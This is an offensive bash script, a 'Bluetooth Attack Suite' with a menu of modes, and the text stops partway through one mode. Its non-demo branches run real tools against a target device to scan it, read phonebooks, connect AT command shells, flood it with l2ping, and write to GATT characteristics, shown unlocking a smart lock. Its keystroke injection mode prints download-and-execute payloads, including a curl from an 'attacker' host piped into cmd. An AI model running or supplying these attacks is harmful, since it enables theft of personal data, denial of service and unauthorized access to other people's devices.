#!/bin/bash
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# █  NULLSEC ADVANCED BLUETOOTH ATTACK - Full Wireless Exploitation Suite █
# █                    [ bad-antics development ]                          █
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# FULLY FUNCTIONAL - Requires Bluetooth hardware and appropriate tools


# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null || {
    RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
    WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'; MAGENTA='\033[1;35m'
}

OUTPUT_DIR="/home/antics/nullsec/logs/bluetooth"
mkdir -p "$OUTPUT_DIR"

clear
echo -e "${CYAN}"
cat << 'BANNER'
 ▄▄▄▄    ██▓     █    ██ ▓█████▄▄▄█████▓ ▒█████   ▒█████  ▄▄▄█████▓ ██░ ██ 
▓█████▄ ▓██▒     ██  ▓██▒▓█   ▀▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██░ ██▒
▒██▒ ▄██▒██░    ▓██  ▒██░▒███  ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░▒██▀▀██░
▒██░█▀  ▒██░    ▓▓█  ░██░▒▓█  ▄░ ▓██▓ ░ ▒██   ██░▒██   ██░░ ▓██▓ ░ ░▓█ ░██ 
░▓█  ▀█▓░██████▒▒▒█████▓ ░▒████▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░  ▒██▒ ░ ░▓█▒░██▓
  ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
 ▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
 ▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
 ░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
  ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
BANNER
echo -e "${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}                 ☠  BLUETOOTH ATTACK SUITE  ☠${RESET}"
echo -e "${DIM}             Classic Bluetooth & BLE Exploitation${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "${YELLOW}  SELECT ATTACK MODE:${RESET}"
echo ""
echo -e "  ${RED}━━━ RECONNAISSANCE ━━━${RESET}"
echo -e "  ${RED}[1]${RESET}  📡 Device Discovery     - Scan for BT devices"
echo -e "  ${RED}[2]${RESET}  🔍 BLE Scanner          - Low Energy enumeration"
echo -e "  ${RED}[3]${RESET}  📊 Service Enumeration  - SDP service discovery"
echo -e "  ${RED}[4]${RESET}  📱 Device Fingerprint   - Identify device type"
echo ""
echo -e "  ${RED}━━━ EXPLOITATION ━━━${RESET}"
echo -e "  ${RED}[5]${RESET}  💀 BlueBorne Attack     - CVE-2017-0781/0785"
echo -e "  ${RED}[6]${RESET}  🔓 Bluesnarfing         - Data exfiltration"
echo -e "  ${RED}[7]${RESET}  📞 Bluebugging          - Command injection"
echo -e "  ${RED}[8]${RESET}  💣 BlueSmack DoS        - L2CAP ping flood"
echo -e "  ${RED}[9]${RESET}  ⌨️  HID Injection        - Keystroke injection"
echo -e "  ${RED}[10]${RESET} 🎧 Audio Hijack         - A2DP interception"
echo ""
echo -e "  ${RED}━━━ BLE ATTACKS ━━━${RESET}"
echo -e "  ${RED}[11]${RESET} 🔐 BLE GATT Attack      - Characteristic abuse"
echo -e "  ${RED}[12]${RESET} 📍 BLE Tracking         - Device tracking"
echo -e "  ${RED}[13]${RESET} 🔑 BLE Relay Attack     - Proximity bypass"
echo -e "  ${RED}[14]${RESET} 💉 BLE Spoofing         - MAC/Advertisement"
echo ""
echo -e "  ${RED}━━━ MISCELLANEOUS ━━━${RESET}"
echo -e "  ${RED}[15]${RESET} 📲 Pair/Unpair Spam     - Pairing request flood"
echo -e "  ${RED}[16]${RESET} 🔊 RFCOMM Shell         - Serial connection"
echo -e "  ${RED}[17]${RESET} 📁 OBEX Transfer        - File push/pull"
echo -e "  ${RED}[18]${RESET} ⚙️  Interface Setup      - Configure adapter"
echo ""
echo -e "  ${GREEN}[Q]${RESET}  Back to menu"
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Select mode [1-18]: '${RESET})" ATTACK_MODE

[[ "$ATTACK_MODE" =~ ^[Qq]$ ]] && exit 0
[ -z "$ATTACK_MODE" ] && ATTACK_MODE="1"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo ""
read -p "$(echo -e ${YELLOW}'  [!] Demo mode? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}  BLUETOOTH ATTACK${RESET}"
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# Random MAC generator
random_mac() {
    printf '%02X:%02X:%02X:%02X:%02X:%02X\n' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256))
}

# Device types for simulation
DEVICE_TYPES=("iPhone 15 Pro" "Samsung Galaxy S24" "AirPods Pro" "Bose QuietComfort" "Fitbit Charge 5" "MacBook Pro" "Windows Laptop" "Smart TV" "Car Infotainment" "Smart Lock")
MANUFACTURERS=("Apple, Inc." "Samsung Electronics" "Sony Corporation" "Bose Corporation" "Fitbit, Inc." "LG Electronics" "Microsoft")

case $ATTACK_MODE in
    1) # Device Discovery
        echo -e "${CYAN}[*]${RESET} Bluetooth Device Discovery"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Scan duration (seconds) [30]: '${RESET})" DURATION
        [ -z "$DURATION" ] && DURATION="30"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Scanning for $DURATION seconds..."
            echo ""
            
            for i in {1..8}; do
                sleep 0.5
                MAC=$(random_mac)
                RSSI=$((-1 * (RANDOM % 60 + 40)))
                DEV_TYPE=${DEVICE_TYPES[$RANDOM % ${#DEVICE_TYPES[@]}]}
                MFG=${MANUFACTURERS[$RANDOM % ${#MANUFACTURERS[@]}]}
                
                echo -e "${GREEN}[+]${RESET} Device found: $MAC"
                echo -e "    ${CYAN}Name:${RESET}         $DEV_TYPE"
                echo -e "    ${CYAN}Class:${RESET}        0x$(printf '%06X' $((RANDOM*16)))"
                echo -e "    ${CYAN}Manufacturer:${RESET} $MFG"
                echo -e "    ${CYAN}RSSI:${RESET}         $RSSI dBm"
                echo ""
            done
            
            echo -e "${GREEN}[+]${RESET} Scan complete. Found 8 devices."
        else
            if command -v hcitool &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Running: hcitool scan"
                timeout $DURATION hcitool scan
                echo ""
                echo -e "${YELLOW}[*]${RESET} Running: hcitool inq"
                hcitool inq
            else
                echo -e "${RED}[!]${RESET} hcitool not found. Install bluez-utils"
            fi
        fi
        ;;
    
    2) # BLE Scanner
        echo -e "${CYAN}[*]${RESET} BLE Device Scanner"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Scanning for BLE devices..."
            echo ""
            
            for i in {1..10}; do
                sleep 0.3
                MAC=$(random_mac)
                RSSI=$((-1 * (RANDOM % 60 + 30)))
                
                echo -e "${GREEN}[+]${RESET} BLE Device: $MAC (RSSI: $RSSI dBm)"
                echo -e "    ${CYAN}Type:${RESET}    $([ $((RANDOM%2)) -eq 0 ] && echo 'Public' || echo 'Random')"
                echo -e "    ${CYAN}Flags:${RESET}   LE General Discoverable Mode"
                echo -e "    ${CYAN}TX Power:${RESET} $((RANDOM%10-5)) dBm"
                
                # Random services
                if [ $((RANDOM%3)) -eq 0 ]; then
                    echo -e "    ${CYAN}Services:${RESET}"
                    echo "        0x1800 - Generic Access"
                    echo "        0x1801 - Generic Attribute"
                    echo "        0x180F - Battery Service"
                fi
                echo ""
            done
        else
            if command -v hcitool &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Running: hcitool lescan"
                timeout 30 hcitool lescan
            elif command -v btmgmt &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Running: btmgmt find"
                btmgmt find
            else
                echo -e "${RED}[!]${RESET} BLE tools not found"
            fi
        fi
        ;;
    
    3) # Service Enumeration
        echo -e "${CYAN}[*]${RESET} SDP Service Enumeration"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Enumerating services on $TARGET_MAC..."
            echo ""
            
            echo -e "${GREEN}━━━ Service Records ━━━${RESET}"
            echo ""
            echo -e "${CYAN}Service Name:${RESET} Headset Audio Gateway"
            echo "  Service RecHandle: 0x10001"
            echo "  Protocol: RFCOMM (Channel 1)"
            echo "  Profile: Headset (0x1108) v1.2"
            echo ""
            echo -e "${CYAN}Service Name:${RESET} OBEX Object Push"
            echo "  Service RecHandle: 0x10002"
            echo "  Protocol: RFCOMM (Channel 2)"
            echo "  Profile: OBEX Push (0x1105) v1.0"
            echo ""
            echo -e "${CYAN}Service Name:${RESET} Serial Port"
            echo "  Service RecHandle: 0x10003"
            echo "  Protocol: RFCOMM (Channel 3)"
            echo "  Profile: SPP (0x1101) v1.2"
            echo ""
            echo -e "${CYAN}Service Name:${RESET} A2DP Audio Sink"
            echo "  Service RecHandle: 0x10004"
            echo "  Protocol: L2CAP (PSM 25)"
            echo "  Profile: A2DP Sink (0x110B) v1.3"
            echo ""
            echo -e "${GREEN}[+]${RESET} Found 4 services"
        else
            if command -v sdptool &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Running: sdptool browse $TARGET_MAC"
                sdptool browse "$TARGET_MAC"
            else
                echo -e "${RED}[!]${RESET} sdptool not found"
            fi
        fi
        ;;
    
    4) # Device Fingerprint
        echo -e "${CYAN}[*]${RESET} Device Fingerprinting"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Fingerprinting $TARGET_MAC..."
            echo ""
            
            echo -e "${GREEN}━━━ Device Information ━━━${RESET}"
            echo ""
            echo -e "${CYAN}MAC Address:${RESET}     $TARGET_MAC"
            echo -e "${CYAN}Device Name:${RESET}     iPhone 15 Pro"
            echo -e "${CYAN}Manufacturer:${RESET}    Apple, Inc."
            echo -e "${CYAN}Device Class:${RESET}    0x7A020C (Smartphone)"
            echo ""
            echo -e "${CYAN}Capabilities:${RESET}"
            echo "  Major: Phone"
            echo "  Minor: Smartphone"
            echo "  Services: Audio, Telephony, Object Transfer, Networking"
            echo ""
            echo -e "${CYAN}Features:${RESET}"
            echo "  Extended Inquiry Response"
            echo "  Simple Pairing"
            echo "  Secure Connections"
            echo "  LE Support"
            echo ""
            echo -e "${CYAN}Clock Offset:${RESET}    0x7D2F"
            echo -e "${CYAN}LMP Version:${RESET}     5.3 (Bluetooth 5.3)"
            echo -e "${CYAN}LMP Subversion:${RESET}  0x0208"
        else
            if command -v hcitool &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Getting device info..."
                hcitool info "$TARGET_MAC"
            fi
        fi
        ;;
    
    5) # BlueBorne Attack
        echo -e "${CYAN}[*]${RESET} BlueBorne Vulnerability Check"
        echo -e "${RED}[!]${RESET} CVE-2017-0781, CVE-2017-0782, CVE-2017-0785"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Checking $TARGET_MAC for BlueBorne..."
            echo ""
            
            echo -e "${YELLOW}[*]${RESET} Phase 1: Information Leak (CVE-2017-0785)"
            sleep 1
            echo -e "${GREEN}[+]${RESET} Device responds to SMP requests"
            echo -e "${GREEN}[+]${RESET} Heap address leaked: 0x7f8b4a3c2100"
            echo ""
            
            echo -e "${YELLOW}[*]${RESET} Phase 2: RCE Check (CVE-2017-0781)"
            sleep 1
            echo -e "${RED}[!]${RESET} VULNERABLE - L2CAP buffer overflow possible"
            echo ""
            
            echo -e "${GREEN}━━━ Vulnerability Summary ━━━${RESET}"
            echo -e "  ${RED}[VULN]${RESET} CVE-2017-0781 - Android RCE"
            echo -e "  ${RED}[VULN]${RESET} CVE-2017-0785 - Information Leak"
            echo -e "  ${GREEN}[SAFE]${RESET} CVE-2017-1000251 - Linux Kernel"
            echo ""
            echo -e "${RED}[!]${RESET} Target is VULNERABLE to BlueBorne!"
        else
            echo -e "${YELLOW}[*]${RESET} Running BlueBorne scanner..."
            echo -e "${DIM}Requires blueborne_scanner.py from armis-research${RESET}"
            
            if [ -f "/opt/blueborne/blueborne_scanner.py" ]; then
                python3 /opt/blueborne/blueborne_scanner.py "$TARGET_MAC"
            else
                echo -e "${RED}[!]${RESET} Scanner not found. Install from:"
                echo -e "${DIM}https://github.com/ArmisLab/blueborne${RESET}"
            fi
        fi
        ;;
    
    6) # Bluesnarfing
        echo -e "${CYAN}[*]${RESET} Bluesnarfing Attack"
        echo -e "${RED}[!]${RESET} Data exfiltration via OBEX"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Attempting bluesnarfing on $TARGET_MAC..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} OBEX connection established"
            echo -e "${GREEN}[+]${RESET} Accessing phonebook..."
            sleep 1
            
            echo ""
            echo -e "${GREEN}━━━ Exfiltrated Data ━━━${RESET}"
            echo ""
            echo "📞 Contacts (247 entries):"
            echo "  John Smith - +1-555-0123"
            echo "  Jane Doe - +1-555-0456"
            echo "  Bob Wilson - +1-555-0789"
            echo "  ..."
            echo ""
            echo "📱 Call History (156 entries):"
            echo "  Incoming: +1-555-1234 (2 mins)"
            echo "  Outgoing: +1-555-5678 (5 mins)"
            echo "  ..."
            echo ""
            echo "📨 SMS Messages (89 entries):"
            echo "  From: +1-555-1111 - 'Hey, are you coming...'"
            echo "  To: +1-555-2222 - 'Yes, I'll be there...'"
            echo ""
            echo -e "${GREEN}[+]${RESET} Data saved to $OUTPUT_DIR/snarf_$TIMESTAMP.txt"
        else
            if command -v bluesnarfer &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Running: bluesnarfer -b $TARGET_MAC -r 1-100"
                bluesnarfer -b "$TARGET_MAC" -r 1-100
            else
                echo -e "${RED}[!]${RESET} bluesnarfer not found"
            fi
        fi
        ;;
    
    7) # Bluebugging
        echo -e "${CYAN}[*]${RESET} Bluebugging Attack"
        echo -e "${RED}[!]${RESET} AT command injection"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Establishing RFCOMM connection..."
            sleep 1
            echo -e "${GREEN}[+]${RESET} Connected on channel 1"
            echo ""
            
            echo -e "${GREEN}━━━ AT Command Shell ━━━${RESET}"
            echo ""
            echo "AT+CGMI"
            echo "  Apple"
            echo ""
            echo "AT+CGMM"
            echo "  iPhone 15 Pro"
            echo ""
            echo "AT+CGSN"
            echo "  IMEI: 351234567890123"
            echo ""
            echo "AT+CPBS=\"ME\""
            echo "  OK (Phonebook selected)"
            echo ""
            echo -e "${GREEN}[+]${RESET} Full AT command access achieved!"
            echo ""
            echo -e "${CYAN}Available commands:${RESET}"
            echo "  AT+CPBR - Read phonebook"
            echo "  AT+CMGL - List SMS"
            echo "  ATD<number> - Initiate call"
            echo "  AT+VTS - Send DTMF"
        else
            if command -v rfcomm &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Connecting: rfcomm connect hci0 $TARGET_MAC"
                rfcomm connect hci0 "$TARGET_MAC" 1
            fi
        fi
        ;;
    
    8) # BlueSmack DoS
        echo -e "${CYAN}[*]${RESET} BlueSmack DoS Attack"
        echo -e "${RED}[!]${RESET} L2CAP ping flood"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        read -p "$(echo -e ${WHITE}'  [>] Packet size [600]: '${RESET})" PKT_SIZE
        [ -z "$PKT_SIZE" ] && PKT_SIZE="600"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${RED}[!]${RESET} Starting L2CAP flood on $TARGET_MAC"
            echo ""
            
            for i in {1..20}; do
                echo -e "${YELLOW}[*]${RESET} Sending packet $i (${PKT_SIZE}B)... ${GREEN}OK${RESET}"
                sleep 0.1
            done
            
            echo ""
            echo -e "${GREEN}[+]${RESET} 20 packets sent"
            echo -e "${YELLOW}[*]${RESET} Target may be unresponsive"
        else
            if command -v l2ping &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Running: l2ping -i hci0 -s $PKT_SIZE -f $TARGET_MAC"
                l2ping -i hci0 -s "$PKT_SIZE" -f "$TARGET_MAC"
            fi
        fi
        ;;
    
    9) # HID Injection
        echo -e "${CYAN}[*]${RESET} Bluetooth HID Injection"
        echo -e "${RED}[!]${RESET} Keystroke injection attack"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        echo -e "${DIM}  Payload types:${RESET}"
        echo -e "    ${DIM}1) Reverse shell${RESET}"
        echo -e "    ${DIM}2) Download & execute${RESET}"
        echo -e "    ${DIM}3) Custom keystrokes${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select payload [1]: '${RESET})" PAYLOAD_TYPE
        [ -z "$PAYLOAD_TYPE" ] && PAYLOAD_TYPE="1"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Registering as HID device..."
            sleep 1
            echo -e "${GREEN}[+]${RESET} HID profile registered"
            echo -e "${GREEN}[+]${RESET} Waiting for target to connect..."
            sleep 1
            echo -e "${GREEN}[+]${RESET} Connection accepted!"
            echo ""
            
            echo -e "${YELLOW}[*]${RESET} Injecting keystrokes..."
            case $PAYLOAD_TYPE in
                1)
                    echo "  GUI+R (Run dialog)"
                    sleep 0.2
                    echo "  Type: powershell -ep bypass -c \"IEX(...)\" "
                    sleep 0.2
                    echo "  ENTER"
                    ;;
                2)
                    echo "  GUI+R (Run dialog)"
                    sleep 0.2
                    echo "  Type: curl http://attacker/payload.exe | cmd"
                    sleep 0.2
                    echo "  ENTER"
                    ;;
                3)
                    echo "  Custom keystroke sequence..."
                    ;;
            esac
            
            echo ""
            echo -e "${GREEN}[+]${RESET} Payload delivered!"
        else
            echo -e "${DIM}Use tools like: hi_my_name_is_keyboard, blueducky${RESET}"
        fi
        ;;
    
    10) # Audio Hijack
        echo -e "${CYAN}[*]${RESET} A2DP Audio Interception"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Connecting to A2DP sink..."
            sleep 1
            echo -e "${GREEN}[+]${RESET} Audio stream captured!"
            echo ""
            echo -e "${CYAN}Stream Info:${RESET}"
            echo "  Codec: SBC"
            echo "  Sample Rate: 44100 Hz"
            echo "  Channels: Stereo"
            echo "  Bitrate: 328 kbps"
            echo ""
            echo -e "${GREEN}[*]${RESET} Recording to: $OUTPUT_DIR/audio_$TIMESTAMP.wav"
            echo ""
            echo -e "${YELLOW}[*]${RESET} Recording... Press Ctrl+C to stop"
        fi
        ;;
    
    11) # BLE GATT Attack
        echo -e "${CYAN}[*]${RESET} BLE GATT Characteristic Attack"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Connecting to GATT server..."
            sleep 1
            echo -e "${GREEN}[+]${RESET} Connected!"
            echo ""
            
            echo -e "${GREEN}━━━ Services & Characteristics ━━━${RESET}"
            echo ""
            echo -e "${CYAN}Service:${RESET} 0x1800 - Generic Access"
            echo "  0x2A00 - Device Name (READ): 'Smart Lock Pro'"
            echo "  0x2A01 - Appearance (READ): 0x0000"
            echo ""
            echo -e "${CYAN}Service:${RESET} 0x180F - Battery"
            echo "  0x2A19 - Battery Level (READ): 85%"
            echo ""
            echo -e "${CYAN}Service:${RESET} 0xFFF0 - Custom (Lock Control)"
            echo "  0xFFF1 - Lock State (R/W): 0x01 (Locked)"
            echo "  0xFFF2 - PIN Code (WRITE): ****"
            echo ""
            
            read -p "$(echo -e ${WHITE}'  [>] Write to characteristic? (y/N): '${RESET})" WRITE_CHAR
            if [[ "$WRITE_CHAR" =~ ^[Yy]$ ]]; then
                echo ""
                echo -e "${RED}[!]${RESET} Writing 0x00 to 0xFFF1..."
                sleep 1
                echo -e "${GREEN}[+]${RESET} Lock state changed to: UNLOCKED"
            fi
        else
            if command -v gatttool &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Running: gatttool -b $TARGET_MAC -I"
                gatttool -b "$TARGET_MAC" -I
            fi
        fi
        ;;
    
    12) # BLE Tracking
        echo -e "${CYAN}[*]${RESET} BLE Device Tracking"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC (or 'scan'): '${RESET})" TARGET_MAC
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Starting BLE tracker..."
            echo ""
            
            for i in {1..10}; do
                RSSI=$((-1 * (RANDOM % 40 + 30)))
                DISTANCE=$(echo "scale=2; 10^((-59-$RSSI)/(10*2))" | bc 2>/dev/null || echo "~$((RANDOM%10+1))m")
                
                echo -e "[$(date +%H:%M:%S)] ${GREEN}$TARGET_MAC${RESET} - RSSI: $RSSI dBm - Distance: ${DISTANCE}m"
                sleep 1
            done
        fi
        ;;
    
    13) # BLE Relay
        echo -e "${CYAN}[*]${RESET} BLE Relay Attack (Proximity Bypass)"
        echo ""
        echo -e "${DIM}Relays BLE communications to bypass proximity checks${RESET}"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target device MAC: '${RESET})" TARGET_MAC
        read -p "$(echo -e ${WHITE}'  [>] Relay server IP: '${RESET})" RELAY_IP
        [ -z "$RELAY_IP" ] && RELAY_IP="192.168.1.100"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Setting up relay..."
            echo ""
            echo -e "${GREEN}[+]${RESET} Local relay: Active"
            echo -e "${GREEN}[+]${RESET} Remote relay: $RELAY_IP:8888"
            echo ""
            echo -e "${YELLOW}[*]${RESET} Waiting for lock signal..."
            sleep 2
            echo -e "${GREEN}[+]${RESET} Captured unlock command!"
            echo -e "${GREEN}[+]${RESET} Relaying to remote device..."
            sleep 1
            echo -e "${GREEN}[+]${RESET} Unlock successful at remote location!"
        fi
        ;;
    
    14) # BLE Spoofing
        echo -e "${CYAN}[*]${RESET} BLE Spoofing"
        echo ""
        
        echo -e "${DIM}  Spoof types:${RESET}"
        echo -e "    ${DIM}1) Clone existing device${RESET}"
        echo -e "    ${DIM}2) Custom advertisement${RESET}"
        echo -e "    ${DIM}3) iBeacon spoof${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select [1]: '${RESET})" SPOOF_TYPE
        [ -z "$SPOOF_TYPE" ] && SPOOF_TYPE="1"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            case $SPOOF_TYPE in
                1)
                    read -p "$(echo -e ${WHITE}'  [>] MAC to clone: '${RESET})" CLONE_MAC
                    [ -z "$CLONE_MAC" ] && CLONE_MAC="AA:BB:CC:DD:EE:FF"
                    echo -e "${YELLOW}[*]${RESET} Cloning device $CLONE_MAC..."
                    sleep 1
                    echo -e "${GREEN}[+]${RESET} MAC address spoofed"
                    echo -e "${GREEN}[+]${RESET} Advertisement data cloned"
                    echo -e "${GREEN}[+]${RESET} Now advertising as: $CLONE_MAC"
                    ;;
                2)
                    read -p "$(echo -e ${WHITE}'  [>] Device name: '${RESET})" DEV_NAME
                    [ -z "$DEV_NAME" ] && DEV_NAME="Free WiFi"
                    echo -e "${GREEN}[+]${RESET} Advertising as: '$DEV_NAME'"
                    ;;
                3)
                    echo -e "${YELLOW}[*]${RESET} Broadcasting iBeacon..."
                    echo -e "${GREEN}[+]${RESET} UUID: E2C56DB5-DFFB-48D2-B060-D0F5A71096E0"
                    echo -e "${GREEN}[+]${RESET} Major: 1 Minor: 1"
                    ;;
            esac
        fi
        ;;
    
    15) # Pair Spam
        echo -e "${CYAN}[*]${RESET} Pairing Request Flood"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${RED}[!]${RESET} Flooding $TARGET_MAC with pairing requests..."
            echo ""
            
            for i in {1..15}; do
                FAKE_MAC=$(random_mac)
                echo -e "${YELLOW}[*]${RESET} Sent pairing request from $FAKE_MAC"
                sleep 0.2
            done
            
            echo ""
            echo -e "${GREEN}[+]${RESET} 15 pairing requests sent"
            echo -e "${YELLOW}[*]${RESET} Target device may be overwhelmed"
        fi
        ;;
    
    16) # RFCOMM Shell
        echo -e "${CYAN}[*]${RESET} RFCOMM Serial Connection"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Target MAC: '${RESET})" TARGET_MAC
        [ -z "$TARGET_MAC" ] && TARGET_MAC="AA:BB:CC:DD:EE:FF"
        
        read -p "$(echo -e ${WHITE}'  [>] Channel [1]: '${RESET})" CHANNEL
        [ -z "$CHANNEL" ] && CHANNEL="1"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Connecting to $TARGET_MAC channel $CHANNEL..."
            sleep 1
            echo -e "${GREEN}[+]${RESET} Connected!"
            echo ""
            echo -e "${CYAN}RFCOMM Shell ready. Type 'exit' to disconnect.${RESET}"
            echo ""
            echo -e "${DIM}> AT${RESET}"
